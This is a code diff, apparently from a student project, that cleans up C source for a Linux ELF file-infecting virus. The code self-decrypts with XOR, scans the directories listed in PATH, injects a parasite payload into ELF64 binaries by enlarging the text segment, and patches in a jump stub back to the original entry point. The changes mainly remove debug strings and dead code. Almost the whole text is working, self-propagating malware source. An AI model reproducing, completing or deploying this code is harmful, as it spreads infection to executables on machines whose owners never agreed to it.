@@ -104,6 +104,7 @@ ssize_t read(int fd, void *buf, size_t count);
 int open(const char *pathname, int flags, mode_t mode);
 int getdents64(unsigned int fd, struct linux_dirent64 *dirp,
                unsigned int count);
+void main_encrypt();
 
 ssize_t write(int fd, const void *buf, size_t count);
 
@@ -115,7 +116,7 @@ extern int myend;
 
 extern int do_main(void);
 
-_start()
+int _start()
 {
 	__asm__(".globl real_start\n"
 	        "real_start:\n"
@@ -148,25 +149,14 @@ _start()
 
 int do_main(void)
 {
-	pid_t pid;
-	void *start;
-	size_t size;
-
-
 	if (process_runing())
+	{
 		return (1);
+	}
 
-	start = 0; //value get from the header
-	size = 0; //value get from addr
-//	pid = fork();
-	//if (pid == 0) //children
-//	{
 		decrypter(get_eip() - ((char *)&yeah - (char *)&real_start));
 		main_encrypt();
-		//decrypt
 
-//		exit (0);
-//	}
 	return (0);
 }
 __syscall0(pid_t, fork);
@@ -211,7 +201,7 @@ bool process_runing(void)
 	}
 	ft_memmove(path,"/proc/",6);
 	char cmdname[64];
-	while ((nread = getdents64(dd, buf, 256)) > 0)
+	while ((nread = getdents64(dd,  (struct linux_dirent64*)buf, 256)) > 0)
 	{
 		i = 0;
 		while(i<nread)
@@ -348,9 +338,9 @@ void decrypter(unsigned long address_of_main)
 
 	offset = *(size_t *)(address_of_main - (sizeof(offset) * 2));
 	size = *(size_t *)(address_of_main - sizeof(offset));
-	start = address_of_main + offset;
+	start = (char *)address_of_main + offset;
 	offset = 0;
-	if(size && im_infected(address_of_main))
+	if(size && im_infected((char *)address_of_main))
 	{
 		start[offset] ^= *(int *)(address_of_main -  (sizeof(offset) * 2));
 		offset++;
@@ -439,7 +429,7 @@ bool	im_infected(char *data)
 	}
 	return(1);
 }
-int main_encrypt()
+void main_encrypt()
 {
 	char path_maj[6];
 	path_maj[0] = 'P';
@@ -506,18 +496,6 @@ int main_encrypt()
 	while(i < path_length);
 
 	infect(path_env, 256);
-	char content[9];
-	content[0] ='c';
-	content[1] ='o';
-	content[2] ='n';
-	content[3] ='t';
-	content[4] ='e';
-	content[5] ='n';
-	content[6] ='t';
-	content[7] =':';
-	content[8] =' ';
-	//write(1,content,9);
-//	write(1,path_env,ft_strlen(path_env));
 }
 __syscall1(int, unlink, const char *, pathname);
 __syscall2(int, fstat, int, fildes, struct stat * , buf);
@@ -602,20 +580,6 @@ int open_directory(char *path)
 	struct linux_dirent64 *d;
 	size_t len;
 
-	char directory[12];
-	directory[0] ='d';
-	directory[1] ='i';
-	directory[2] ='r';
-	directory[3] ='e';
-	directory[4] ='c';
-	directory[5] ='t';
-	directory[6] ='o';
-	directory[7] ='r';
-	directory[8] ='y';
-	directory[9] =':';
-	directory[10] =' ';
-	directory[11] = 0;
-
 //	write(1,path,ft_strlen(path));
 //	write(1,"\n",1);
 	//printf("directory: '%s'\n",path);
@@ -635,16 +599,10 @@ int open_directory(char *path)
 	dd = open(path, 0x10000,0);
 	if (dd < 0)
 	{
-
-		//printf("open fail: '%s'\n",path);
 		return 1;
-
 	}
-
-//	__asm__("int3");
-	int c;
 	int i;
-	while ((nread = getdents64(dd, buf, 128)) > 0)
+	while ((nread = getdents64(dd, (struct linux_dirent64*)buf, 128)) > 0)
 	{
 		for (i = 0 ; i < nread;)
 		{
@@ -667,7 +625,7 @@ int open_directory(char *path)
 			{
 				fstat(fd , &st);
 				char mem[st.st_size];
-				for (size_t j =0; j < st.st_size;j++)
+				for (long int j =0; j < st.st_size;j++)
 					mem[j] = 0;
 				int c = read(fd, mem,st.st_size);
 				if (c > 0)
@@ -706,34 +664,13 @@ void    ft_putnbr(long long n)
 
 int do_the_job(char buff[],size_t size, char *path)
 {
-
-	//printf("debut do_the_job\n");
-
 	unsigned int payload_len = ((char *)&myend - (char *)&real_start ) + SIZE_BEFORE_ENTRY_POINT;
-
-//	ft_putchar('\n');
-	Elf64_Addr parasite_vaddr;
-	int text_found = 0;
-	int i;
-	char ono[3];
-	ono[0] = '1';
-	ono[1]='\n';
-	ono[2]=0;
-
-
-//	write(1, buff, 100);
-	//write(1,buff,120);
-	//ft_putchar('\n');
-
 	if (size < sizeof(Elf64_Ehdr)  || buff[EI_MAG0] != 0x7f || buff[EI_MAG1] != 'E' || buff[EI_MAG2] != 'L' || buff[EI_MAG3] != 'F'  || buff[EI_CLASS] != ELFCLASS64)
 	{
 		return (1);
 	}
-
-
 	Elf64_Ehdr* hdr;
 	Elf64_Phdr* phdr;
-	Elf64_Shdr* shdr;
 	Elf64_Addr entry, payload_vaddr, text_end;
 
 	// Get the elf_header
@@ -744,8 +681,6 @@ int do_the_job(char buff[],size_t size, char *path)
 	entry = hdr->e_entry;
 
 	phdr = (Elf64_Phdr*) (buff + hdr->e_phoff);
-	shdr = (Elf64_Shdr*) (buff + hdr->e_shoff);
-	uint64_t text;
 	// Increase section header offset by PAGE_SIZE
 
 	hdr->e_shoff += PAGE_SZ64 + PAGE_SIZE*4;
@@ -762,7 +697,6 @@ int do_the_job(char buff[],size_t size, char *path)
 
 
 			//puts("text found");
-			text = phdr[i].p_offset;
 			text_end = phdr[i].p_offset + phdr[i].p_filesz;
 			payload_vaddr = phdr[i].p_vaddr + phdr[i].p_filesz + PAGE_SIZE*4;
 
@@ -832,14 +766,6 @@ void new_file(char buf[],size_t size, size_t end_of_text,const char *path,Elf64_
 	unsigned int parasite_size = ((char *)&myend - (char *)&real_start) +29;
 	char jmp_code[9];
 
-	jmp_code[0] = '\x68'; /* push */
-	jmp_code[1] = '\x00'; /* 00 	*/
-	jmp_code[2] = '\x00'; /* 00	*/
-	jmp_code[3] = '\x00'; /* 00	*/
-	jmp_code[4] = '\x00'; /* 00	*/
-	jmp_code[5] = '\xc3'; /* ret */
-	jmp_code[6] = 0;
-
 	jmp_code[0] = '\x81'; /* push */
 	jmp_code[1] = '\x2c'; /* 00 	*/
 	jmp_code[2] = '\x24'; /* 00	*/
@@ -849,13 +775,6 @@ void new_file(char buf[],size_t size, size_t end_of_text,const char *path,Elf64_
 	jmp_code[6] = '\x00'; /* 00	*/
 	jmp_code[7] = '\xc3'; /* ret */
 	jmp_code[8] = '\xc3';
-	Elf64_Ehdr* hdr = buf;
-
-
-
-
-
-	//exit(4);
 
 	*(unsigned int*) &jmp_code[3] = old_e_entry;
 
@@ -894,7 +813,7 @@ ft_putnbr(parasite_size);
 
 	size_wrote += write(fd,jmp_code,9);
 
-	for (int i = 0; i< PAGE_SIZE - size_wrote ;i++)
+	for (long unsigned int i = 0; i< PAGE_SIZE - size_wrote ;i++)
 		write(fd,"j",1);
 
 	write(fd,buf + end_of_text, size - end_of_text);
@@ -1067,63 +986,14 @@ bool	is_infected2(char *data)
 
 	i = 0;
 	header = (Elf64_Ehdr *)data;
-	char name_enter[16];
-	name_enter[0] ='e';
-	name_enter[1]='n';
-	name_enter[2]='t';
-	name_enter[3]='e';
-	name_enter[4]='r';
-	name_enter[5]=' ';
-	name_enter[6]='i';
-	name_enter[7]='n';
-	name_enter[8]='f';
-	name_enter[9]='e';
-	name_enter[10]='c';
-	name_enter[11]='t';
-	name_enter[12]='e';
-	name_enter[13]='d';
-	name_enter[14]='\n';
-	name_enter[15]=0;
-
 		while(sig[i])
 		{
 			if (sig[i] !=  *((char *)(data + header->e_entry - SIZE_BEFORE_ENTRY_POINT + i)))
 			{
-				char is_inf[18];
-				is_inf[0]='i';
-				is_inf[1]='s';
-				is_inf[2]=' ';
-				is_inf[3]='i';
-				is_inf[4]='n';
-				is_inf[5]='f';
-				is_inf[6]='e';
-				is_inf[7]='c';
-				is_inf[8]='t';
-				is_inf[9]='e';
-				is_inf[10]='d';
-				is_inf[11]=' ' ;
-				is_inf[12]='r';
-				is_inf[13]='e';
-				is_inf[14]='t';
-				is_inf[15]=' ' ;
-				is_inf[16]='0';
-				is_inf[17]=0;
-
 				return(0);
-
 			}
 			i++;
 		}
-		char name_ret[7];
-	name_ret[0] ='r';
-	name_ret[1]='e';
-	name_ret[2]='t';
-	name_ret[3]=' ';
-	name_ret[4]='1';
-	name_ret[5]='\n';
-	name_ret[6]=0;
-
-
 	return(1);
 }
 
@@ -1197,19 +1067,8 @@ size_t	put_sig(int fd)
 	size_t size;
 	unsigned long address_of_main = get_eip() - ((char *)&yeah - (char *)&real_start);
 
-	if (im_infected(address_of_main))
+	if (im_infected((char *)address_of_main))
 	{
-			char name_new[9];
-		name_new[0]='n';
-		name_new[1]='e';
-		name_new[2]='w';
-		name_new[3]=' ';
-		name_new[4]='o';
-		name_new[5]='n';
-		name_new[6]='e';
-		name_new[7]='\n';
-		name_new[8]=0;
-
 		*(long long *)fingerprint = address_of_main - sizeof(long long);
 	}
 
@@ -1257,6 +1116,7 @@ size_t i ;
 		size--;
 		return (i);
 	}
+	return 0;
 }
 
 void end_code() {
